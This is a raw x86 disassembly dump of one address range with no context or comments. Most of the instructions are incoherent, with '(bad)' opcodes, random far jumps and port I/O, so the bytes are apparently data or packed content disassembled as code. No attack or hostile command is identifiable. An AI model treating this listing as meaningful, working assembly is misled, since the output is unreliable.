  407884:	push   DWORD PTR [ebx-0x8]
  407887:	je     0x40786f
  407889:	jecxz  0x4078eb
  40788b:	imul   ebx,DWORD PTR [ebp+0x3f2436f],0x40
  407892:	dec    edx
  407893:	cwde   
  407894:	dec    ebp
  407895:	push   eax
  407896:	stos   DWORD PTR es:[edi],eax
  407897:	(bad)  [edx]
  407899:	sti    
  40789a:	pop    edi
  40789b:	adc    eax,0x4cf3cdf8
  4078a0:	fs stos DWORD PTR es:[edi],eax
  4078a2:	push   ss
  4078a3:	in     eax,0xe
  4078a5:	push   eax
  4078a6:	jmp    0x40784b
  4078a8:	aas    
  4078a9:	(bad)  
  4078aa:	in     eax,0x5c
  4078ac:	cs ins BYTE PTR es:[edi],dx
  4078ae:	mov    ds:0x69d6dd5b,eax
  4078b3:	cld    
  4078b4:	xor    bh,BYTE PTR [di]
  4078b7:	xor    DWORD PTR [edx],eax
  4078b9:	push   ebp
  4078ba:	xchg   esi,eax
  4078bb:	pop    ss
  4078bc:	bound  ebx,QWORD PTR fs:[esp+ebp*4-0x2a6b9648]
  4078c4:	mov    ebx,0x11ee10f
  4078c9:	dec    edi
  4078ca:	das    
  4078cb:	xchg   ecx,eax
  4078cc:	cmc    
  4078cd:	jmp    0x40787d
  4078cf:	repnz xor BYTE PTR [ebp+0x4c0647a3],bl
  4078d6:	in     al,dx
  4078d7:	popf   
  4078d8:	mov    esi,0xba73264e
  4078dd:	and    ecx,DWORD PTR [ecx+0x71]
  4078e0:	hlt    
  4078e1:	push   eax
  4078e2:	add    edx,DWORD PTR [ecx]
  4078e4:	shr    BYTE PTR ds:0x19bd4eb9,0xcf
  4078eb:	hlt    
  4078ec:	lds    edi,FWORD PTR [ebx+0x5c15e3e1]
  4078f2:	mov    ebp,edx
  4078f4:	mov    ?,WORD PTR [esi-0x26]
  4078f7:	nop
  4078f8:	add    dl,BYTE PTR [esi+0x3292474e]
  4078fe:	stos   DWORD PTR es:[edi],eax
  4078ff:	pop    ebx
  407900:	clc    
  407901:	bound  edi,QWORD PTR [ebx+ecx*4+0x22]
  407905:	sbb    BYTE PTR [ecx+0x31eadb32],ch
  40790b:	mov    eax,ds:0x1b9e3d50
  407910:	or     eax,0x8ea28bc9
  407915:	rcr    ah,1
  407917:	(bad)  
  407918:	fimul  WORD PTR [esi+0x1d1a0fbb]
  40791e:	outs   dx,BYTE PTR ds:[esi]
  40791f:	and    BYTE PTR [edx+edx*2],cl
  407922:	and    eax,0x87babf5c
  407927:	test   BYTE PTR [ecx-0xbe0bf95],0xe2
  40792e:	lock xchg esp,eax
  407930:	jb     0x4079ac
  407932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407933:	int    0x54
  407935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407936:	add    ecx,esi
  407938:	mov    bh,0x1d
  40793a:	cld    
  40793b:	out    0xea,al
  40793d:	xor    eax,0x9e35e683
  407942:	mov    al,0x4e
  407944:	mov    bl,0xd1
  407946:	outs   dx,BYTE PTR ss:[esi]
  407948:	inc    esp
  407949:	push   ds
  40794a:	push   ds
  40794b:	dec    esi
  40794c:	popa   
  40794d:	cmp    dh,BYTE PTR [ebx-0x2e]
  407950:	fldcw  WORD PTR [edi+0x77]
  407953:	xor    DWORD PTR [eax],ebx
  407955:	cmp    BYTE PTR [edx],bh
  407957:	dec    eax
  407958:	jae    0x4079c4
  40795a:	mov    bh,0x82
  40795c:	push   ecx
  40795d:	retf   0x45c1
  407960:	mov    esp,DWORD PTR [ecx+0x7e256566]
  407966:	pop    edi
  407967:	cmp    BYTE PTR [edx],ch
  407969:	jbe    0x40793e
  40796b:	and    eax,0xe881ab61
  407970:	fadd   QWORD PTR [edx]
  407972:	sbb    ecx,DWORD PTR [edx+0x56]
  407975:	sbb    al,0xc0
  407977:	jl     0x407912
  407979:	enter  0x7222,0x47
  40797d:	jg     0x407961
  40797f:	mov    esi,0xced8b432
  407984:	jge    0x4079f2
  407986:	mov    esi,0xd696766b
  40798b:	and    DWORD PTR [ebx-0xf95e55],eax
  407991:	dec    edx
  407992:	ds pop eax
  407994:	xchg   ebp,eax
  407995:	mov    edx,0x2fdbb7f7
  40799a:	add    edi,ebx
  40799c:	aas    
  40799d:	xor    bh,dl
  40799f:	sbb    eax,0xb2693649
  4079a4:	push   ss
  4079a5:	(bad)  
  4079a7:	pop    esp
  4079a8:	loopne 0x407a12
  4079aa:	adc    ch,BYTE PTR [esi+0x5ba320c3]
  4079b0:	ins    DWORD PTR es:[edi],dx
  4079b1:	bound  eax,QWORD PTR [ebx]
  4079b3:	test   eax,0x47b7ce59
  4079b8:	lods   eax,DWORD PTR ds:[esi]
  4079b9:	in     eax,dx
  4079ba:	int3   
  4079bb:	xor    eax,0xd4e1db99
  4079c0:	mov    al,ds:0xaa7c219
  4079c5:	xlat   BYTE PTR ds:[ebx]
  4079c6:	neg    DWORD PTR [edx]
  4079c8:	das    
  4079c9:	ins    DWORD PTR es:[edi],dx
  4079ca:	sbb    ebx,DWORD PTR [edi+0x7aaf3317]
  4079d0:	inc    ebp
  4079d1:	push   ds
  4079d2:	and    cl,BYTE PTR [ebp+0x77]
  4079d5:	mov    esp,0xf659dbc4
  4079da:	ins    BYTE PTR es:[edi],dx
  4079db:	addr16 jnp 0x407a22
  4079de:	out    0x6,eax
  4079e0:	fstp   QWORD PTR [eax-0x7d]
  4079e3:	push   cs
  4079e4:	test   eax,esi
  4079e6:	(bad)  
  4079e7:	pop    ecx
  4079e8:	in     al,0xae
  4079ea:	loop   0x4079ff
  4079ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ed:	or     esi,edi
  4079ef:	scas   eax,DWORD PTR es:[edi]
  4079f0:	pop    es
  4079f1:	stc    
  4079f2:	push   edx
  4079f3:	(bad)  
  4079f4:	sbb    BYTE PTR [esp+ebp*4-0x22],bh
  4079f8:	std    
  4079f9:	repnz and BYTE PTR [ecx-0x7568613d],ch
  407a00:	cmp    DWORD PTR [ebp-0x64],esp
  407a03:	in     eax,dx
  407a04:	push   es
  407a05:	cmp    bl,BYTE PTR [ecx-0x6]
  407a08:	mov    ecx,0x7bee092f
  407a0d:	aad    0xca
  407a0f:	and    esp,DWORD PTR [ecx+0x258e57f9]
  407a15:	add    esi,esp
  407a17:	sbb    edx,DWORD PTR [edx+eax*4-0x39]
  407a1b:	mov    eax,ds:0xb3f0027
  407a20:	cmp    ebp,DWORD PTR [edi]
  407a22:	arpl   cx,dx
  407a24:	lods   al,BYTE PTR ds:[esi]
  407a25:	push   ebx
  407a26:	jge    0x4079de
  407a28:	mov    ss,esp
  407a2a:	jb     0x407a21
  407a2c:	mov    ebp,0xda46e738
  407a31:	loop   0x4079d3
  407a33:	shr    esp,1
  407a35:	mov    cl,0xf6
  407a37:	pop    esi
  407a38:	imul   cl
  407a3a:	jo     0x407a70
  407a3c:	pop    ebp
  407a3d:	and    ah,BYTE PTR [edi]
  407a3f:	sub    cl,dl
  407a41:	mov    esp,0x5e8218f
  407a46:	push   esi
  407a47:	push   edx
  407a48:	(bad)  
  407a49:	(bad)  
  407a4a:	xchg   ebx,eax
  407a4b:	dec    esp
  407a4c:	test   al,0x89
  407a4e:	mov    edi,0xe0ff9eb8
  407a53:	add    BYTE PTR [edi+0x6a],ch
  407a56:	out    0x1,al
  407a58:	xchg   esp,eax
  407a59:	jmp    0x407a69
  407a5b:	fwait
  407a5c:	jo     0x407a75
  407a5e:	scas   al,BYTE PTR es:[edi]
  407a5f:	iret   
  407a60:	xor    ebp,ebp
  407a62:	retf   
  407a63:	xor    eax,0xae68a036
  407a68:	inc    ecx
  407a69:	and    bl,BYTE PTR [esp+edi*4]
  407a6c:	dec    DWORD PTR [esi+0x39ff3619]
  407a72:	pop    eax
  407a73:	jmp    0x407ac8
  407a75:	jno    0x407ab5
  407a77:	sahf   
  407a78:	ret    0x867b
  407a7b:	and    edx,esp
  407a7d:	icebp  
  407a7e:	pop    edx
  407a7f:	gs dec edi
  407a81:	cmp    edi,esi
  407a83:	imul   DWORD PTR [esi*4+0x7aa660a9]
  407a8a:	mov    ecx,DWORD PTR [esi+0x58]
  407a8d:	outs   dx,BYTE PTR ds:[esi]
  407a8e:	test   DWORD PTR es:[eax],esp
  407a91:	fiadd  WORD PTR [ecx-0x68458848]
  407a97:	sbb    edi,ebx
  407a99:	or     ebp,DWORD PTR [ecx-0x38]
  407a9c:	(bad)  
  407a9e:	mov    ah,0x8
  407aa0:	mov    al,ds:0xda36ff50
  407aa5:	mov    ebp,DWORD PTR [eax]
  407aa7:	sbb    dh,BYTE PTR [ebx+eax*2-0x47]
  407aab:	inc    edi
  407aac:	pop    edx
  407aad:	fidivr DWORD PTR [esi+0xc6daad8]
  407ab3:	jno    0x407a73
  407ab5:	push   ss
  407ab6:	(bad)  
  407ab7:	and    esi,DWORD PTR [ecx]
  407ab9:	adc    DWORD PTR ds:0x136fb3d0,esp
  407abf:	shl    BYTE PTR [ebx+0x58],1
  407ac2:	jns    0x407b38
  407ac4:	stos   DWORD PTR es:[edi],eax
  407ac5:	inc    ecx
  407ac6:	jmp    DWORD PTR [edx-0x3f74c15c]
  407acc:	(bad)  
  407acd:	pop    esi
  407ace:	mov    eax,ds:0xda78d621
  407ad3:	jle    0x407b19
  407ad5:	test   al,0x91
  407ad7:	cmp    ah,BYTE PTR [ebp-0x2]
  407ada:	es scas al,BYTE PTR es:[edi]
  407adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407add:	sub    eax,0x8a010891
  407ae2:	pop    ebp
  407ae3:	inc    edi
  407ae4:	icebp  
  407ae5:	add    al,BYTE PTR [edx+0x31]
  407ae8:	mov    al,ds:0xe701e629
  407aed:	nop
  407aee:	xor    al,0xd5
  407af0:	or     dl,BYTE PTR [eax+0x55]
  407af3:	pop    ds
  407af4:	xchg   edx,eax
  407af5:	jae    0x407b6a
  407af7:	test   BYTE PTR [eax-0x14],0x67
  407afb:	sub    DWORD PTR [ecx+0x2d0d997d],edi
  407b01:	pop    eax
  407b02:	push   DWORD PTR [edi-0x79]
  407b05:	mov    eax,esi
  407b07:	aaa    
  407b08:	sub    cl,BYTE PTR [ecx+0x4e5a8d43]
  407b0e:	mov    WORD PTR [edi+0x5d],fs
  407b11:	mov    DWORD PTR [ebx],0x5efa9634
  407b17:	jl     0x407aa0
  407b19:	jno    0x407b79
  407b1b:	mov    ebx,0xb299a85d
  407b20:	sbb    cl,BYTE PTR [edi+edi*1]
  407b23:	adc    BYTE PTR [ebp-0x78806ac8],bh
  407b29:	mov    esp,DWORD PTR [eax+0x7a86cd57]
  407b2f:	push   0x9298a5e7
  407b34:	(bad)  
  407b35:	pop    ebp
  407b36:	ret    0xdc6d
  407b39:	add    ebp,DWORD PTR [ebp-0x78]
  407b3c:	imul   edx,DWORD PTR [edx-0x6a],0x63
  407b40:	dec    BYTE PTR [edi+0xa]
  407b43:	retf   
  407b44:	(bad)  
  407b45:	scas   al,BYTE PTR es:[edi]
  407b46:	jne    0x407bc6
  407b48:	mov    al,cl
  407b4a:	fwait
  407b4b:	pop    ebp
  407b4c:	gs inc ebx
  407b4e:	in     eax,dx
  407b4f:	mov    ch,BYTE PTR [ebx-0x55]
  407b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b53:	pop    ds
  407b54:	adc    BYTE PTR [edi-0x14],dh
  407b57:	call   0xb42ac70e
  407b5c:	rol    BYTE PTR [esi],0xba
  407b5f:	cdq    
  407b60:	je     0x407b73
  407b62:	fs add eax,0x602a0c54
  407b68:	adc    eax,0x9444f56e
  407b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b6e:	xchg   ecx,eax
  407b6f:	adc    eax,0xca8b3195
  407b74:	out    dx,eax
  407b75:	cmp    BYTE PTR [edx-0x787bea14],0xb5
  407b7c:	mov    edi,0x21850b61
  407b81:	pop    esp
  407b82:	sub    eax,0x47bb5e2a
  407b87:	je     0x407b89
  407b89:	pop    es
  407b8a:	pop    esp
  407b8b:	adc    BYTE PTR [ecx-0x73],dh
  407b8e:	pop    ds
  407b8f:	and    bh,BYTE PTR [esi]
  407b91:	dec    ecx
  407b92:	add    bl,BYTE PTR [ebx+0x1f]
  407b95:	and    eax,DWORD PTR [edi-0x45e13582]
  407b9b:	adc    ah,BYTE PTR [edx]
  407b9d:	cmp    DWORD PTR [edi+0x7c],edx
  407ba0:	addr16 cld 
  407ba2:	inc    eax
  407ba3:	jns    0x407bb8
  407ba5:	lods   al,BYTE PTR ds:[esi]
  407ba6:	and    eax,0xe0de7600
  407bab:	push   ecx
  407bac:	setno  BYTE PTR [edi+0x38e72551]
  407bb3:	pop    ecx
  407bb4:	jle    0x407bbd
  407bb6:	sub    dl,BYTE PTR [ebp-0x481c44ed]
  407bbc:	cli    
  407bbd:	inc    esi
  407bbe:	and    eax,0x93c7bbef
  407bc3:	and    al,0x2
  407bc5:	mov    ds:0x1b609afb,eax
  407bca:	dec    ecx
  407bcb:	inc    ebx
  407bcc:	retf   0xea4d
  407bcf:	fsubr  DWORD PTR [edi-0x4e]
  407bd2:	int    0xf8
  407bd4:	js     0x407bcf
  407bd6:	dec    esi
  407bd7:	adc    eax,0x3cceb2ae
  407bdc:	add    BYTE PTR [ebp-0x6ce277f0],ch
  407be2:	enter  0x8059,0x86
  407be6:	or     dl,dh
  407be8:	retf   0x2c93
  407beb:	ret    
  407bec:	jg     0x407bf3
  407bee:	inc    ebp
  407bef:	sbb    eax,0x556f3e17
  407bf4:	xchg   edi,eax
  407bf5:	out    0x79,al
  407bf7:	sub    BYTE PTR [edx+0x3d],dl
  407bfa:	sahf   
  407bfb:	add    BYTE PTR [edi-0x69d4661e],ah
  407c01:	dec    ecx
  407c02:	mov    BYTE PTR [ebx],ah
  407c04:	push   ebp
  407c05:	xchg   esi,eax
  407c06:	push   ss
  407c07:	cmp    bl,BYTE PTR [eax+0x64194a9d]
  407c0d:	lods   al,BYTE PTR ds:[esi]
  407c0e:	push   ebp
  407c0f:	imul   esi,DWORD PTR [edx+0x1a460975],0x9dd81135
  407c19:	cmp    bh,BYTE PTR [eax]
  407c1b:	sbb    al,0x58
  407c1d:	pop    DWORD PTR [edx+0x5061ccfb]
  407c23:	inc    edi
  407c24:	or     bl,BYTE PTR [esi-0x1914618c]
  407c2a:	mov    ah,0xe7
  407c2c:	lahf   
  407c2d:	mov    cl,0xcd
  407c2f:	fwait
  407c30:	and    BYTE PTR [esp+eiz*2-0x49],ch
  407c34:	in     eax,dx
  407c35:	test   eax,0xd684a947
  407c3a:	into   
  407c3b:	call   0xd6a5:0xa4bb9a28
  407c42:	call   0x62505337
  407c47:	scas   eax,DWORD PTR es:[edi]
  407c48:	call   0x39c2adac
  407c4d:	and    ch,BYTE PTR [esp+eax*1-0xa72b8b1]
  407c54:	mov    cl,0x26
  407c56:	mov    ds:0xeb51d0b9,al
  407c5b:	cli    
  407c5c:	jge    0x407c34
  407c5e:	jp     0x407c5d
  407c60:	mov    ebp,0x50d783df
  407c65:	pop    esi
  407c66:	ins    DWORD PTR es:[edi],dx
  407c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c68:	or     BYTE PTR [edi+0xa2e2963],cl
  407c6e:	pop    ss
  407c6f:	sub    BYTE PTR [eax+edi*4+0x27],ch
  407c73:	ins    DWORD PTR es:[edi],dx
  407c74:	int3   
  407c75:	imul   DWORD PTR [eax-0x4a]
  407c78:	xchg   edx,eax
  407c79:	mov    dl,0x47
  407c7b:	(bad)  
  407c7c:	xor    eax,0x8b1d0697
  407c81:	loopne 0x407cc4
  407c83:	mov    edx,0xd9fc6ef5
  407c88:	xor    DWORD PTR [edx+0x436d2659],0xb67ff6ba
  407c92:	jmp    0xf280:0x388f4917
  407c99:	sub    eax,0xf1fbf358
  407c9e:	dec    ecx
  407c9f:	test   eax,0xe9a85e76
  407ca4:	add    dl,BYTE PTR [ebx-0x7f]
  407ca7:	rcl    DWORD PTR [edx-0x5b],cl
  407caa:	bnd jae 0x407c38
  407cad:	retf   0xa4bc
  407cb0:	dec    eax
  407cb1:	es jne 0x407cb8
  407cb4:	ror    BYTE PTR ds:0x4dcf6b41,1
  407cba:	add    DWORD PTR [ebx],esi
  407cbc:	retf   
  407cbd:	inc    edx
  407cbe:	lock shl dh,cl
  407cc1:	imul   eax,DWORD PTR [edx+0x1c],0xb9855c8f
  407cc8:	out    dx,al
  407cc9:	rcr    BYTE PTR [eax-0x13],1
  407ccc:	xchg   BYTE PTR [ebx+0x56ed3cb4],bl
  407cd2:	in     eax,0x2a
  407cd4:	push   ebp
  407cd5:	jns    0x407c78
  407cd7:	xchg   ebx,eax
  407cd8:	jle    0x407cde
  407cda:	sahf   
  407cdb:	push   eax
  407cdc:	push   esp
  407cdd:	cmp    BYTE PTR [edi-0xe],dh
  407ce0:	int    0xc4
  407ce2:	adc    eax,0x14ef2348
  407ce7:	push   edi
  407ce8:	ins    BYTE PTR es:[edi],dx
  407ce9:	or     eax,0xacef8654
  407cee:	inc    edi
  407cef:	jge    0x407cf7
  407cf1:	test   al,0x57
  407cf3:	cli    
  407cf4:	push   ebx
  407cf5:	jg     0x407d34
  407cf7:	stos   BYTE PTR es:[edi],al
  407cf8:	pop    edi
  407cf9:	test   eax,0x402d53c5
  407cfe:	and    al,0x8e
  407d00:	cwde   
  407d01:	mov    ecx,0xeb09289f
  407d06:	cwde   
  407d07:	pop    es
  407d08:	dec    esp
  407d09:	mov    al,ds:0xb5ce5d76
  407d0e:	scas   al,BYTE PTR es:[edi]
  407d0f:	pop    ss
  407d10:	fisub  WORD PTR [ebp+0x5d]
  407d13:	sub    BYTE PTR [edx+0x19],dh
  407d16:	aad    0xd9
  407d18:	xchg   esp,eax
  407d19:	in     al,dx
  407d1a:	outs   dx,BYTE PTR ss:[esi]
  407d1c:	aaa    
  407d1d:	xor    bh,0xf1
  407d20:	add    eax,esp
  407d22:	push   ecx
  407d23:	jno    0x407cb4
  407d25:	inc    esi
  407d26:	pop    esi
  407d27:	scas   al,BYTE PTR es:[edi]
  407d28:	(bad)  
  407d29:	dec    esi
  407d2a:	(bad)  
  407d2b:	je     0x407d23
  407d2d:	sub    bh,al
  407d2f:	sbb    BYTE PTR [edi+0x7d],ah
  407d32:	sar    BYTE PTR [edx],cl
  407d34:	push   ecx
  407d35:	or     eax,0xe274b661
  407d3a:	sub    dl,dl
  407d3c:	sub    DWORD PTR [edi-0x3146202f],ebp
  407d42:	add    al,dl
  407d44:	mov    dh,bh
  407d46:	pop    edi
  407d47:	jp     0x407d60
  407d49:	sbb    BYTE PTR [edi+0x78],bl
  407d4c:	fisub  WORD PTR ds:0x1ed50769
  407d52:	ret    
  407d53:	adc    dh,ah
  407d55:	shl    esi,1
  407d57:	aaa    
  407d58:	popa   
  407d59:	add    bh,bh
  407d5b:	pop    ss
  407d5c:	push   edi
  407d5d:	nop
  407d5e:	(bad)  
  407d5f:	outs   dx,DWORD PTR ds:[esi]
  407d60:	lahf   
  407d61:	jns    0x407cf4
  407d63:	test   al,0x82
  407d65:	fiadd  WORD PTR [esi]
  407d67:	sbb    DWORD PTR [edx],ebp
  407d69:	cli    
  407d6a:	mov    al,ds:0xa369d28e
  407d6f:	mov    ds:0x261f832d,al
  407d74:	test   eax,0x279c7dc1
  407d79:	loope  0x407dd3
  407d7b:	sbb    BYTE PTR [edx-0x15d9469c],bl
  407d81:	data16 mov BYTE PTR [ebx],0xe1
  407d85:	mov    BYTE PTR [edi+eiz*2-0x3b],cl
  407d89:	inc    esp
  407d8a:	push   eax
  407d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d8c:	mov    ah,BYTE PTR [ebp+0x38]
  407d8f:	xor    cl,0x8c
  407d92:	jge    0x407d92
  407d94:	cs jl  0x407d72
  407d97:	mov    edi,edi
  407d99:	add    eax,0xbcf20755
  407d9e:	adc    dh,BYTE PTR [ecx]
  407da0:	xchg   ebp,eax
  407da1:	dec    ebx
  407da2:	or     DWORD PTR [edi+0x2],eax
  407da5:	jns    0x407da6
  407da7:	xchg   esp,eax
  407da8:	xchg   BYTE PTR [edx-0x3cafc817],cl
  407dae:	jmp    0x407dc3
  407db0:	xlat   BYTE PTR ds:[ebx]
  407db1:	clc    
  407db2:	rol    DWORD PTR [esi-0x479ccaf5],cl
  407db8:	or     BYTE PTR [ecx],cl
  407dba:	dec    ecx
  407dbb:	leave  
  407dbc:	dec    ebx
  407dbd:	cwde   
  407dbe:	ss pop ebx
  407dc0:	mov    bl,0xfc
  407dc2:	ss xchg esp,eax
  407dc4:	and    eax,0xeb3058ba
  407dc9:	xlat   BYTE PTR ds:[ebx]
  407dca:	xchg   cl,cl
  407dcc:	cmp    esp,ebp
  407dce:	stc    
  407dcf:	scas   eax,DWORD PTR es:[edi]
  407dd0:	or     edi,DWORD PTR [ebp+ebx*4-0x4a]
  407dd4:	jl     0x407dee
  407dd6:	jb     0x407d6c
  407dd8:	and    bh,BYTE PTR [edi-0x11]
  407ddb:	sub    BYTE PTR [edi+0xa],ah
  407dde:	cdq    
  407ddf:	stc    
  407de0:	popa   
  407de1:	cld    
  407de2:	jmp    0xed0e:0xcc3a8a7b
  407de9:	call   0x13bd0d09
  407dee:	fcmovne st,st(3)
  407df0:	aad    0x5
  407df2:	mov    al,0xdc
  407df4:	push   eax
  407df5:	mov    ch,0xf1
  407df7:	retw   
  407df9:	out    0xe5,eax
  407dfb:	xchg   ebp,eax
  407dfc:	ja     0x407d94
  407dfe:	arpl   WORD PTR [esi],bx
  407e00:	mov    WORD PTR [eax-0x41e54f17],gs
  407e06:	cdq    
  407e07:	cmp    DWORD PTR [eax-0x4a0eb95a],esp
  407e0d:	out    0xae,eax
  407e0f:	mov    dl,0xd4
  407e11:	xchg   esi,eax
  407e12:	adc    dh,bl
  407e14:	sbb    eax,DWORD PTR [edx+ebx*1]
  407e17:	ror    dh,0x8e
  407e1a:	pop    ebp
  407e1b:	cmp    BYTE PTR [edi],cl
  407e1d:	addr16 rol edx,1
  407e20:	out    0x7c,eax
  407e22:	es jnp 0x407ea3
  407e25:	loopne 0x407ddd
  407e27:	xchg   esp,eax
  407e28:	sub    cl,BYTE PTR [edi-0x1b1bcdb4]
  407e2e:	push   esp
  407e2f:	and    bl,BYTE PTR [edi-0x5113f24b]
  407e35:	pop    es
  407e36:	loopne 0x407e11
  407e38:	jo     0x407e39
  407e3a:	hlt    
  407e3b:	mov    al,0x68
  407e3d:	daa    
  407e3e:	inc    ebx
  407e3f:	inc    edi
  407e40:	call   0x576bc597
  407e45:	icebp  
  407e46:	sar    BYTE PTR [eax+0x61],0xef
  407e4a:	retf   
  407e4b:	pop    ss
  407e4c:	(bad)  
  407e4d:	jno    0x407e2e
  407e4f:	add    DWORD PTR [ebp+0x5ad22632],eax
  407e55:	push   cs
  407e56:	and    ah,BYTE PTR es:[esi+0x7d]
  407e5a:	rol    BYTE PTR [edi+0x319da6b2],cl
  407e60:	inc    esp
  407e61:	imul   eax,edx,0x76ba7526
  407e67:	mov    dl,0x8c
  407e69:	inc    edx
  407e6a:	jo     0x407ea5
  407e6c:	scas   eax,DWORD PTR es:[edi]
  407e6d:	fld    QWORD PTR [edx+0x4e]
  407e70:	sub    dl,BYTE PTR [eax-0x56]
  407e73:	stc    
  407e74:	(bad)  
  407e76:	imul   eax,DWORD PTR ds:0x174b5972,0x7
  407e7d:	(bad)  
  407e7e:	repz xor al,0x85
  407e81:	test   edx,eax
  407e83:	fwait
  407e84:	data16 icebp 
  407e86:	xchg   BYTE PTR [eax],ch
  407e88:	js     0x407e9e
  407e8a:	in     eax,dx
  407e8b:	push   0xffffff98
  407e8d:	cs ss hlt 
  407e90:	ds xchg ebx,eax
  407e92:	mov    ch,0x58
  407e94:	cwde   
  407e95:	xor    ch,bl
  407e97:	sub    dl,BYTE PTR [esp+eiz*2+0x637b0492]
  407e9e:	dec    ecx
  407e9f:	cmp    DWORD PTR [eax+0x4e5f2fbc],0xbf51a4f7
  407ea9:	mov    ebp,0xa90f54b2
  407eae:	mov    ?,WORD PTR [esi+0x74]
  407eb1:	mov    ah,0x48
  407eb3:	mov    esi,DWORD PTR [edx-0x4d2cbd8b]
  407eb9:	jg     0x407eb8
  407ebb:	pushf  
  407ebc:	xchg   ecx,eax
  407ebd:	jl     0x407f09
  407ebf:	sub    ch,BYTE PTR [ebp-0x5f]
  407ec2:	lods   eax,DWORD PTR ds:[esi]
  407ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec4:	or     eax,0xa233094e
  407ec9:	or     eax,0x84e61205
  407ece:	rcr    DWORD PTR [esi],1
  407ed0:	ret    0x9188
  407ed3:	inc    edi
  407ed4:	idiv   BYTE PTR [edx-0x124568d8]
  407eda:	scas   eax,DWORD PTR es:[edi]
  407edb:	out    dx,al
  407edc:	xor    eax,0xf8c608b9
  407ee1:	push   eax
  407ee2:	inc    ebp
  407ee3:	mov    eax,DWORD PTR [eax+ebp*2]
  407ee6:	loope  0x407f20
  407ee8:	mul    DWORD PTR [esi]
  407eea:	mov    ?,WORD PTR [ebx]
  407eec:	das    
  407eed:	xchg   ebx,eax
  407eee:	outs   dx,DWORD PTR ds:[esi]
  407eef:	xor    esp,DWORD PTR [eax+0x2f]
  407ef2:	aam    0xb2
  407ef4:	bnd jb 0x407f61
  407ef7:	jnp    0x407ed5
  407ef9:	arpl   WORD PTR [edi+edi*2+0x6a],bp
  407efd:	pop    ds
  407efe:	adc    al,0xcd
  407f00:	dec    ebx
  407f01:	inc    ebp
  407f02:	mov    edi,0x291f462d
  407f07:	adc    al,0xb
  407f09:	jne    0x407f77
  407f0b:	or     al,dl
  407f0d:	cmp    BYTE PTR [eax],al
  407f0f:	jp     0x407f76
  407f11:	jo     0x407e97
  407f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f14:	aas    
  407f15:	mov    dl,0x2f
  407f17:	sub    DWORD PTR ds:0xc9b588d4,esp
  407f1d:	jle    0x407f74
  407f1f:	inc    ebx
  407f20:	jge    0x407f4f
  407f22:	cmc    
  407f23:	xor    ah,BYTE PTR [edx-0x2c]
  407f26:	pop    es
  407f27:	xor    al,0x18
  407f29:	ds push esi
  407f2b:	xlat   BYTE PTR ds:[ebx]
  407f2c:	call   0xb8453a50
  407f31:	(bad)  
  407f32:	jg     0x407f22
  407f34:	in     al,0x27
  407f36:	(bad)  
  407f37:	xor    ah,BYTE PTR [ebp+0x2327df73]
  407f3d:	mov    dl,0xd6
  407f3f:	mov    WORD PTR [ebp+esi*1-0x2034a431],es
  407f46:	out    dx,al
  407f47:	sub    BYTE PTR [eax],dh
  407f49:	mov    eax,0x5c62adda
  407f4e:	jae    0x407f93
  407f50:	xchg   esp,eax
  407f51:	sahf   
  407f52:	cs in  eax,dx
  407f54:	or     al,0xbf
  407f56:	cmp    edx,DWORD PTR [eax+ebp*8+0x71]
  407f5a:	adc    ebp,ebx
  407f5c:	sub    esi,DWORD PTR [eax+0x25]
  407f5f:	or     esi,ebp
  407f61:	(bad)  
  407f62:	sub    edi,DWORD PTR [ebp+edi*2+0xe]
  407f66:	inc    ebx
  407f67:	rcr    BYTE PTR [ecx-0x39],1
  407f6a:	push   edx
  407f6b:	fisttp DWORD PTR [ebp-0x271d3bfa]
  407f71:	lods   al,BYTE PTR ds:[esi]
  407f72:	sub    DWORD PTR [esp+eiz*2+0x44],eax
  407f76:	pop    eax
  407f77:	out    0x9e,eax
  407f79:	inc    esi
  407f7a:	or     cl,al
  407f7c:	lea    ebx,[ebx+0x70]
  407f7f:	stc    
  407f80:	inc    esp
  407f81:	cld    
  407f82:	pop    esp
  407f83:	lock (bad) 
  407f85:	adc    al,ch
  407f87:	adc    al,BYTE PTR [eax+0x24d09ce]
  407f8d:	loop   0x408001
  407f8f:	scas   eax,DWORD PTR es:[edi]
  407f90:	push   esp
  407f91:	repnz jmp 0x89fd:0xbbb0e337
  407f99:	popf   
  407f9a:	cmp    ebx,DWORD PTR [ebx]
  407f9c:	or     edi,DWORD PTR ds:0x14f88a50
  407fa2:	sbb    BYTE PTR [edi+eax*2-0x476e68bc],cl
  407fa9:	jbe    0x407ff6
  407fab:	pushf  
  407fac:	xor    BYTE PTR [ebx-0x54],bl
  407faf:	jns    0x407f9b
  407fb1:	into   
  407fb2:	mov    WORD PTR [eax],?
  407fb4:	call   0xc0c8:0xa69a0766
  407fbb:	mov    edx,DWORD PTR [ebx]
  407fbd:	and    dh,ah
  407fbf:	mov    esi,ecx
  407fc1:	(bad)  
  407fc2:	dec    ecx
  407fc3:	test   BYTE PTR [esi+0x5b7b93c8],dl
  407fc9:	jo     0x408041
  407fcb:	repz hlt 
  407fcd:	and    edi,DWORD PTR [ecx]
  407fcf:	xor    BYTE PTR [eax+edi*1],dh
  407fd2:	(bad)  
  407fd3:	loope  0x407fad
  407fd5:	retf   0xf0fb
  407fd8:	daa    
  407fd9:	aaa    
  407fda:	and    cl,BYTE PTR [ecx-0x782d373a]
  407fe0:	dec    edi
  407fe1:	icebp  
  407fe2:	daa    
  407fe3:	jmp    0x29d5:0x28717f2
  407fea:	mov    BYTE PTR [ebx+0x3c],ah
  407fed:	mov    ch,0x19
  407fef:	nop
  407ff0:	mov    edx,0x1e589404
  407ff5:	pop    esi
  407ff6:	cs call 0x4f08:0x6ce79776
  407ffe:	(bad)  
  407fff:	jmp    0x407fea
  408001:	(bad)  
  408002:	sbb    cl,al
  408004:	xor    WORD PTR [ebx+0x5b0f42ae],bx
  40800b:	mov    ds,WORD PTR [esi+ebp*1-0xe74afab]
  408012:	inc    esi
  408013:	loope  0x40806e
  408015:	push   ebp
  408016:	push   esp
  408017:	push   ebx
  408018:	fimul  DWORD PTR [edx]
